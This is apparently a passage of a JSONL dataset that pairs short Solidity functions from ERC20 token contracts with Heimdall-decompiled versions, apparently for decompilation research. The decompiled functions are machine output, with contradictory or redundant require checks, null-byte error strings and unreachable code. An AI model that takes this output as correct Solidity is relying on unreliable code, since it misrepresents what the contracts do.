transfer from the zero address\");\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        uniswapV2Pair = 0x010000000000000000000000000000000000000000 | (uint248(uniswapV2Pair));\n        var_a = address(this);\n        var_b = 0;\n        if (!store_u > (store_v + store_u)) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (!tradingActive / 0x0100) {\n                if (!tradingActive / 0x0100) {\n                    if (!tradingActive / 0x0100) {\n                        if (!tradingActive / 0x0100) {\n                            if (!tradingActive / 0x0100) {\n                            }\n                        }\n                    }\n                }\n            }\n            require(!(store_u > (store_v + store_u)), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x1c;\n            require(bytes1(tradingActive), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1b;\n            require(!(bytes1(storage_map_b[var_a])), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1c;\n            require(!(!bytes1(storage_map_b[var_a])), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x1b;\n            require(!(bytes1(storage_map_b[var_a])), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1b;\n            require(!(!bytes1(storage_map_b[var_a])), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n        }\n        require(!(arg1 > maxTransactionAmount), \"ERC20: Sell transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x3d;\n        var_g = 0x45524332303a2053656c6c207472616e7366657220616d6f756e742065786365;\n        var_h = 0x65647320746865206d61785472616e73616374696f6e416d6f756e742e000000;\n        if (!storage_map_b[var_a]) {\n        }\n        require(!(arg1 > maxTransactionAmount), \"ERC20: Buy transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x3c;\n        var_g = 0x45524332303a20427579207472616e7366657220616d6f756e74206578636565;\n        var_h = 0x647320746865206d61785472616e73616374696f6e416d6f756e742e00000000;\n        if (!storage_map_b[var_a]) {\n        }\n        var_a = address(msg.sender);\n        var_b = 0x1a;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: Trading is not active.\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: Trading is not active.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x1d;\n        var_g = 0x45524332303a2054726164696e67206973206e6f74206163746976652e000000;\n        if (!address(arg0)) {\n            if (!address(arg0)) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xD551F2Bd835B49DB742f0382d441Ede9C7C1Ee30", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x25;\n        var_c = this.code[17883:17920];\n        address var_d = address(msg.sender);\n        var_e = 0x02;\n        var_d = address(arg0);\n        address var_e = keccak256(var_d);\n        require(!(arg1 > storage_map_c[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_a) + 0x20) - (0x04 + var_a);\n        uint256 var_h = var_a.length;\n        uint256 var_i = 0;\n        require(!(!(address(msg.sender)) == 0), \"ERR: zero address\");\n        require(!(address(arg0) == 0), \"ERR: zero address\");\n        var_d = address(msg.sender);\n        var_e = 0x02;\n        var_d = address(arg0);\n        var_e = keccak256(var_d);\n        storage_map_c[var_d] = storage_map_c[var_d] - arg1;\n        address var_f = storage_map_c[var_d] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_c[var_d] - arg1);\n        var_f = 0x01;\n        return 0x01;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_a) + 0x20) - (0x04 + var_a);\n        var_h = 0x11;\n        var_j = 0x4552523a207a65726f2061646472657373000000000000000000000000000000;\n    }"}
{"contract_address": "0x20ad88B64104B4E9B3915aAB9c3bfb4E4121622f", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"Blacklisted\");\n        require(address(arg0), \"Blacklisted\");\n        address var_a = address(msg.sender);\n        var_b = 0x13;\n        require(!(!bytes1(storage_map_n[var_a])), \"Blacklisted\");\n        require(!(bytes1(storage_map_n[var_a])), \"Blacklisted\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x0b;\n        var_f = 0x426c61636b6c6973746564000000000000000000000000000000000000000000;\n        require(0 - arg1, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(bytes1(tradingActive)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(address(owner) == (address(msg.sender)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!(address(owner)) == (address(arg0))), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(address(arg0)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!0xdead == (address(arg0))), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!0xdead == (address(arg0))), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = address(this);\n        uint256 var_b = 0;\n        require(storage_map_n[var_a] < swapTokensAtAmount, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!storage_map_n[var_a] < swapTokensAtAmount), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!storage_map_n[var_a] < swapTokensAtAmount), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!storage_map_n[var_a] < swapTokensAtAmount), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!storage_map_n[var_a] < swapTokensAtAmount), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!storage_map_n[var_a] < swapTokensAtAmount), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = address(msg.sender);\n        var_b = 0x20;\n        require(bytes1(storage_map_n[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(bytes1(storage_map_n[var_a])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = address(arg0);\n        var_b = 0x22;\n        require(!(bytes1(storage_map_n[var_a])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(lastLpBurnTimea > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require((lastLpBurnTimea == ((lastLpBurnTimea * arg1) / arg1)) | !arg1, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n        var_a = address(msg.sender);\n        var_b = 0x22;\n        require(!(bytes1(storage_map_n[var_a])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(lastLpBurnTimef > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(address(msg.sender), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(address(this), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_h = 0x60 + var_h;\n        var_c = 0x26;\n        var_i = this.code[11007:11045];\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(0 > storage_map_n[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x20;\n        uint256 var_l = var_h.length;\n        uint256 var_m = 0;\n        require(!((storage_map_n[var_a] - 0) > storage_map_n[var_a]), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_n[var_a] = storage_map_n[var_a] - 0;\n        var_a = address(this);\n        require(!(storage_map_n[var_a] > (0 + storage_map_n[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(!((0 + storage_map_n[var_a]) < storage_map_n[var_a]), \"SafeMath: addition overflow\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x20;\n        var_l = 0x1b;\n        var_n = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_k = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_k = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_k = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer from the zero address\");\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_k = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x22;\n        if (!storage_map_n[var_a]) {\n            if (!lastLpBurnTimea > 0) {\n                var_a = address(msg.sender);\n                var_b = 0x22;\n                require(!(bytes1(storage_map_n[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n                require(!(lastLpBurnTimea > 0), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n                require(!(bytes1(storage_map_n[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            }\n            require(!(lastLpBurnTimef > 0), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x20;\n            require(bytes1(tradingActive / 0x0100), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(bytes1(storage_map_n[var_a]), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(!(bytes1(transferDelayEnabled)), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(address(owner) == (address(arg0)), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(!(!(address(arg0)) == 0x7a250d5630b4cf539739df2c5dacb4c659f2488d), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(!(!(address(arg0)) == 0x7a250d5630b4cf539739df2c5dacb4c659f2488d), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x22;\n            require(!(bytes1(storage_map_n[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x21;\n            require(!(!bytes1(storage_map_n[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x22;\n            require(!(bytes1(storage_map_n[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x21;\n            require(!(!bytes1(storage_map_n[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x21;\n            require(bytes1(storage_map_n[var_a]), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        }\n        require(!(arg1 > lastLpBurnTimed), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x36;\n        var_f = 0x53656c6c207472616e7366657220616d6f756e74206578636565647320746865;\n        var_k = 0x206d61785472616e73616374696f6e416d6f756e742e00000000000000000000;\n        if (!storage_map_n[var_a]) {\n        }\n        require(!(arg1 > lastLpBurnTimed), \"Buy transfer amount exceeds the maxTransactionAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x35;\n        var_f = 0x427579207472616e7366657220616d6f756e7420657863656564732074686520;\n        var_k = 0x6d61785472616e73616374696f6e416d6f756e742e0000000000000000000000;\n        if (!storage_map_n[var_a]) {\n        }\n        var_a = tx.origin;\n        var_b = 0x12;\n        require(block.number > storage_map_n[var_a], \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x49;\n        var_f = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_k = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_l = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        if (address(owner) == (address(arg0))) {\n            if (address(owner) == (address(arg0))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x16;\n        var_f = 0x54726164696e67206973206e6f74206163746976652e00000000000000000000;\n        if (!address(arg0)) {\n            if (!address(arg0)) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_k = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_k = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB14c3a406A345F2b4E79aB45d81A63E9a815ec71", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_aa) {\n            if (!(store_aa) == ((store_aa / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_aa / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_aa / 0x02;\n                if (store_aa) {\n                    if (!(store_aa) == ((store_aa / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_aa / 0x02) {\n                            if (0x1f < (store_aa / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_aa / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                        return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x10A7A2212f6b6ffE22d339D8Aa6e89a17ad8b1ad", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(arg1 - 0, \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(tradingActive / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        var_b = 0x16;\n        require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!totalTaxTokens < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!totalTaxTokens < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!totalTaxTokens < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!totalTaxTokens < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!totalTaxTokens < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!totalTaxTokens < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(swapV2Pair / 0x01000000000000000000000000000000000000000000)), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x16;\n        require(bytes1(storage_map_b[var_a] / 0x01), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!arg1 | (sellTotalFees == ((arg1 * sellTotalFees) / arg1)), \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x2710, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(((arg1 * sellTotalFees) / 0x2710) > 0), \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(this) - 0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < ((arg1 * sellTotalFees) / 0x2710)), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x26;\n        var_h = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_i = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - ((arg1 * sellTotalFees) / 0x2710);\n        var_a = address(this);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] + ((arg1 * sellTotalFees) / 0x2710);\n        uint256 var_d = (arg1 * sellTotalFees) / 0x2710;\n        emit Transfer(address(msg.sender), address(this), (arg1 * sellTotalFees) / 0x2710);\n        require(!arg1 | (0x1e == ((arg1 * 0x1e) / arg1)), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x2710, \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(((arg1 * 0x1e) / 0x2710) > ((arg1 * sellTotalFees) / 0x2710)), \"ERC20: transfer to the zero address\");\n        require(!(tokensForGen > (tokensForGen + ((arg1 * sellTotalFees) / 0x2710))), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        tokensForGen = tokensForGen + ((arg1 * sellTotalFees) / 0x2710);\n        require(!((arg1 - ((arg1 * sellTotalFees) / 0x2710)) > arg1), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender) - 0, \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x17;\n        if 